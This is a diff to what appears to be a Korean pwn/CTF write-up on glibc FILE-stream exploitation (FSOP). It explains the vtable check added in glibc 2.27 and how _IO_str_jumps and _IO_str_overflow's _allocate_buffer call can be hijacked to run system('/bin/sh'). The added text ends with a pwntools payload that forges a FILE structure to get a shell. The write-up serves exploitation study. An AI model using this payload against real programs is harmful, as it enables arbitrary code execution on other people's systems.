@@ -137,15 +137,12 @@ _IO_new_file_xsputn에서 4개의 분기점을 살펴보자.
 출력 데이터 길이가 0이하인경우 함수를 종료시킴
 
 (2)  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
-
 flag설정 확인, 현재 라인 버퍼 모드인지, 현재 쓰기작업중인지.
 
 (3) if (count > 0) 
-
 이후 쓸 데이터보다 _IO_write_end - _IO_write_ptr이 크다면 큰만큼 버퍼에 데이터를 복사한다.
 
 (4) if (to_do + must_flush > 0)
-
 must_flush값은 출력할 문자열에 '\n' 값 개수에 따라 달라짐. 
 
 
@@ -635,7 +632,7 @@ libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
 
 ```
 
-모든 if문을 패스하고 _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);을 호출하는걸 볼수있다.
+flag값을 원래 stdin 사용시 사용되는 값으로 고정하면 모든 if문을 패스하고 _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);을 호출하는걸 볼수있다.
 
 즉 _IO_buf_base와 _IO_buf_end를 적절히 조작하면 우리가 원하는 위치에 데이터를 쓸수있다.
 
@@ -692,4 +689,359 @@ p.sendline(pay)
 stdout을 이용해서 puts()를 호출할때 vtable의 데이터들 조작해서 vtable을 참조해서 _IO_overflow() 같은 함수를 호출할때 system이나 one_gadget으로 덮어 쉘을 실행시키도록 할 예정이였다.
 
 하지만 2.27이상 버전부터는 vtable 주소에대해 유효한 주소값인지 검증하는 로직이 추가되었다.
+
+glibc/libio/libioP.h:1027
+```c
+
+static inline const struct _IO_jump_t *
+IO_validate_vtable (const struct _IO_jump_t *vtable)
+{
+  uintptr_t ptr = (uintptr_t) vtable;
+  uintptr_t offset = ptr - (uintptr_t) &__io_vtables;
+  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))
+    /* The vtable pointer is not in the expected section.  Use the
+       slow path, which will terminate the process if necessary.  */
+    _IO_vtable_check ();
+  return vtable;
+}
+```
+
+vtable의 주소가 유효한 offset범위내인지 검증을한다.
+그러므로 우리는 메모리상의 조작된 vtable이 아닌 만들어진 유효한 vtables주소중 하나를 조작해서 쉘을 실행시켜야한다.
+
+glibc에서 정의되어있는 테이블의 종류는 다음과 같다(glibc 버전별로 조금 다르다.)
+
+glibc/libio/libioP.h.html:513   ==(GLIBC 2.27 version)==
+```c
+
+extern const struct _IO_jump_t _IO_file_jumps;
+libc_hidden_proto (_IO_file_jumps)
+extern const struct _IO_jump_t _IO_file_jumps_mmap attribute_hidden;
+extern const struct _IO_jump_t _IO_file_jumps_maybe_mmap attribute_hidden;
+extern const struct _IO_jump_t _IO_wfile_jumps;
+libc_hidden_proto (_IO_wfile_jumps)
+extern const struct _IO_jump_t _IO_wfile_jumps_mmap attribute_hidden;
+extern const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap attribute_hidden;
+extern const struct _IO_jump_t _IO_old_file_jumps attribute_hidden;
+extern const struct _IO_jump_t _IO_streambuf_jumps;
+extern const struct _IO_jump_t _IO_old_proc_jumps attribute_hidden;
+extern const struct _IO_jump_t _IO_str_jumps attribute_hidden;
+extern const struct _IO_jump_t _IO_wstr_jumps attribute_hidden;
+
+```
+
+시간이되면 모두 보고 어떤 함수들을 호출하고 어떤구조인지 보고싶지만.. 우리에겐 시간이 소중하다. 
+
+FSOP공격 기법에서 vtable우회를 하기위해 사용될 구조체는 _IO_str_jumps이다.
+
+### why _IO_str_jumps
+
+glibc/libio/vtables.c.html:95
+```c
+
+  /* _IO_str_jumps  */
+  [IO_STR_JUMPS] =
+  {
+    JUMP_INIT_DUMMY,
+    JUMP_INIT (finish, _IO_str_finish),
+    JUMP_INIT (overflow, _IO_str_overflow),
+    JUMP_INIT (underflow, _IO_str_underflow),
+    JUMP_INIT (uflow, _IO_default_uflow),
+    JUMP_INIT (pbackfail, _IO_str_pbackfail),
+    JUMP_INIT (xsputn, _IO_default_xsputn),
+    JUMP_INIT (xsgetn, _IO_default_xsgetn),
+    JUMP_INIT (seekoff, _IO_str_seekoff),
+    JUMP_INIT (seekpos, _IO_default_seekpos),
+    JUMP_INIT (setbuf, _IO_default_setbuf),
+    JUMP_INIT (sync, _IO_default_sync),
+    JUMP_INIT (doallocate, _IO_default_doallocate),
+    JUMP_INIT (read, _IO_default_read),
+    JUMP_INIT (write, _IO_default_write),
+    JUMP_INIT (seek, _IO_default_seek),
+    JUMP_INIT (close, _IO_default_close),
+    JUMP_INIT (stat, _IO_default_stat),
+    JUMP_INIT (showmanyc, _IO_default_showmanyc),
+    JUMP_INIT (imbue, _IO_default_imbue)
+  },
+
+```
+
+그리고 IO_str_jumps는 _IO_strfile_구조체로 정의가된다.
+
+
+우리가 _IO_str_jumps에 주목해야하는 이유는 overflow위치에 있는 _IO_str_overflow함수의 동작때문이다.
+
+
+### _IO_str_overflow 
+
+
+```c
+
+int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp->_flags & _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+    {
+      fp->_flags |= _IO_CURRENTLY_PUTTING;
+      fp->_IO_write_ptr = fp->_IO_read_ptr;
+      fp->_IO_read_ptr = fp->_IO_read_end;
+    }
+  pos = fp->_IO_write_ptr - fp->_IO_write_base;
+  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
+	return EOF;
+      else
+	{
+	  char *new_buf;
+	  char *old_buf = fp->_IO_buf_base;
+	  size_t old_blen = _IO_blen (fp);
+	  _IO_size_t new_size = 2 * old_blen + 100;
+	  if (new_size < old_blen)
+	    return EOF;
+	  new_buf
+	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); //[step1]
+	  
+    
+    ...
+}
+libc_hidden_def (_IO_str_overflow)
+
+```
+
+step1 부분을보면 (*(_IO_strfile *))fp->_s._allocate_buffer(new_size)로 함수를 호출하는것을 볼수있다.
+
+### _IO_strfile
+
+우리가 앞에서 봤던 file구조체는 아래와 같이 FILE구조체와 vtable로 구성되어있다.
+```c
+
+struct _IO_streambuf
+{
+  struct _IO_FILE _f;
+  const struct _IO_jump_t *vtable;
+};
+
+```
+
+그런데 위에서 _IO_str_jumps의 _IO_str_overflow함수에서 fp의 함수를 호출할때 _IO_strfile구조체 형식으로 호출하는것을 볼수있는데 아래는 _IO_strfile의 구조체이다.
+
+```c
+typedef struct _IO_strfile_
+{
+  struct _IO_streambuf _sbf;
+  struct _IO_str_fields _s;
+} _IO_strfile;
+
+```
+
+위에서 봤던 구조체에 _IO_str_fields 구조체가 추가된걸 알수있다.
+
+```c
+
+struct _IO_str_fields
+{
+  _IO_alloc_type _allocate_buffer;
+  _IO_free_type _free_buffer;
+};
+
+```
+
+_IO_str_fields에는 _IO_str_overflow()함수 내부에서 (*(_IO_strfile *))fp->_s._allocate_buffer(new_size) 이런식으로 호출되는 _allocate_buffer의 데이터가있다.
+
+이부분을 gadget이나 system으로 덮으면 될꺼같다.
+
+glibc가 업데이트되면서 (*(_IO_strfile *))fp->_s._allocate_buffer(new_size) 여기의 코드는 malloc()함수로 바뀌게된다.
+
+
+전체적인 _IO_str_jumps의 구조
+
+```c
+
+{ _sbf = 
+  {
+    _f =  { _flags = 0, 
+      _IO_read_ptr = 0, 
+      _IO_read_end = 03777776751621240, 
+      _IO_read_base = 03777776751617420,
+      _IO_write_base = 03777776751617260,
+      _IO_write_ptr = 03777776751601560, 
+      _IO_write_end = 03777776751621200, 
+      _IO_buf_base = 03777776751601720,
+      _IO_buf_end = 03777776751602600, 
+      _IO_save_base = 03777776751621720, 
+      _IO_backup_base = 03777776751604500, 
+      _IO_save_end = 03777776751604020,
+      _markers = 03777776751606000, 
+      _chain = 03777776751604660,
+      _fileno = 036751616540, 
+      _flags2 = 077777, 
+      _old_offset = 03777776751616560,
+      _cur_column = 016500, 
+      _vtable_offset = 0247, 
+      _shortbuf = {0367}, 
+      _lock = 03777776751606000, 
+      _offset = 03777776751616520,
+      _codecvt = 03777776751616600, 
+      _wide_data = 03777776751616620, 
+      _freeres_list = 0, 
+      _freeres_buf = 0, 
+      __pad5 = 0, 
+      _mode = 0, 
+      _unused2 = {0 <repeats 12 times>, 0240, 042, 0247, 0367, 0377, 0177, 0, 0}
+    }, 
+    
+    vtable = 03777776754236600}, 
+  _s = {
+    _allocate_buffer_unused = 03777776751617260, 
+    _free_buffer_unused = 03777776751601560}
+}
+
+
+```
+
+
+그럼 이제 _s의 _allocate_buffer_unused 위치에 system을 써야한다는걸 알았고 binsh를 (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); 의 new_size에 넣을려면 앞에서 조건을 조금 맞춰줘야한다.
+
+
+### binsh for newsize
+
+```c
+
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp->_flags & _IO_NO_WRITES) //1
+      return flush_only ? 0 : EOF;
+  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING)) //2
+    {
+      fp->_flags |= _IO_CURRENTLY_PUTTING;
+      fp->_IO_write_ptr = fp->_IO_read_ptr;
+      fp->_IO_read_ptr = fp->_IO_read_end;
+    }
+  pos = fp->_IO_write_ptr - fp->_IO_write_base;
+  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)) //3
+    {
+      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
+	return EOF;
+      else
+	{
+	  char *new_buf;
+	  char *old_buf = fp->_IO_buf_base;
+	  size_t old_blen = _IO_blen (fp);
+	  _IO_size_t new_size = 2 * old_blen + 100; //4
+	  if (new_size < old_blen)
+	    return EOF;
+	  new_buf
+	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
+
+```
+
+_IO_str_overflow함수를 if문 순서대로 따라가보자.
+
+1 : fp-_flags값에 _IO_NO_WRITES(0x0008)를 확인하는데 기본 flag값은 0xfbad2887이므로 여기는 그냥 패스한다.
+
+2 : 두번째 !(fp->_flags & _IO_CURRENTLY_PUTTING(0x0800)) 이 조건에서 flags는 현재 0x0800으로 설정되어 있기떄문에 2번쨰의 조건을 만족하지못해 패스한다.
+
+3 : pos >= (_IO_size_t) (_IO_blen (fp) + flush_only) 에서 pos와 _IO_blen(fp)
+와 flush_only를 더한값을 비교하는데 _IO_blen은 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base) 로 정의가 되어있다.
+flush_only는 EOF로 -1.
+
+fp->_IO_write_ptr - fp->_IO_write_base >= _IO_buf_end - _IO_buf_base + (-1)
+
+통과하면 flags가 _IO_USER_BUF인지 검사하는데 이를 우회하기위해 flags값을 0xfbad2887 -> 0xfbad2886으로 변경해주어야한다.
+
+4 : new size 에 2*((fp)->_IO_buf_end - (fp)->_IO_buf_base) + 100 계산을하고 넣는다. 우리는 new_size에 binsh주소값을 넣을예정이라 binsh주소를 역연산해서 넣어줘야한다.
+
+offset
+```
+pwndbg>  ptype /o struct _IO_FILE
+/* offset      |    size */  type = struct _IO_FILE {
+/*      0      |       4 */    int _flags;
+/* XXX  4-byte hole      */
+/*      8      |       8 */    char *_IO_read_ptr;
+/*     16      |       8 */    char *_IO_read_end;
+/*     24      |       8 */    char *_IO_read_base;
+/*     32      |       8 */    char *_IO_write_base;
+/*     40      |       8 */    char *_IO_write_ptr;
+/*     48      |       8 */    char *_IO_write_end;
+/*     56      |       8 */    char *_IO_buf_base;
+/*     64      |       8 */    char *_IO_buf_end;
+/*     72      |       8 */    char *_IO_save_base;
+/*     80      |       8 */    char *_IO_backup_base;
+/*     88      |       8 */    char *_IO_save_end;
+/*     96      |       8 */    struct _IO_marker *_markers;
+/*    104      |       8 */    struct _IO_FILE *_chain;
+/*    112      |       4 */    int _fileno;
+/*    116      |       4 */    int _flags2;
+/*    120      |       8 */    __off_t _old_offset;
+/*    128      |       2 */    unsigned short _cur_column;
+/*    130      |       1 */    signed char _vtable_offset;
+/*    131      |       1 */    char _shortbuf[1];
+/* XXX  4-byte hole      */
+/*    136      |       8 */    _IO_lock_t *_lock;
+/*    144      |       8 */    __off64_t _offset;
+/*    152      |       8 */    struct _IO_codecvt *_codecvt;
+/*    160      |       8 */    struct _IO_wide_data *_wide_data;
+/*    168      |       8 */    struct _IO_FILE *_freeres_list;
+/*    176      |       8 */    void *_freeres_buf;
+/*    184      |       8 */    size_t __pad5;
+/*    192      |       4 */    int _mode;
+/*    196      |      20 */    char _unused2[20];
+
+                               /* total size (bytes):  216 */
+                             }
+
+```
+
+## exploit 
+
+
+```python
+
+pay+=p64(0)
+pay+=p64(stdin)*4
+pay+=p64(leak_stdout) #_IO_buf_base
+pay+=p64(leak_stdout+0x2000) #_IO_buf_end
+pay=pay.ljust(0x84,b'\x00')
+p.sendline(pay)
+
+log.info("step1 clear")
+one_gadget=libc_main+0x4f365
+#exploit
+pay=p32(0xfbad2886)
+pay+=p32(0)
+pay+=p64(leak_stdout)*3
+pay+=p64(0)#write_base => 0
+pay+=p64((binsh-100)//2) #write_ptr
+pay+=p64(0)*2 #write_end,buf_base
+pay+=p64((binsh-100)//2) #buf_end
+pay+=p64(0)*4
+pay+=p64(stdin) #chain
+pay+=p32(1)
+pay+=p32(0)
+pay+=p64(0xffffffffffffffff) #old offset
+pay+=p16(0)
+pay+=p8(0)
+pay+=b"\n" #short buf
+pay+=p32(0) #hole
+pay+=p64(lock)
+pay+=p64(0xffffffffffffffff) #offset
+pay+=p64(0)
+pay+=p64(wide_data)
+pay+=p64(0)*2 #freeres_list,buf
+pay+=p64(0)
+pay+=p32(0xffffffff)
+pay+=b'\0'*20
+print(len(pay))
+pay+=p64(str_jumps)
+pay+=p64(system)
+pay+=p64(leak_stdout)
+
+```
 
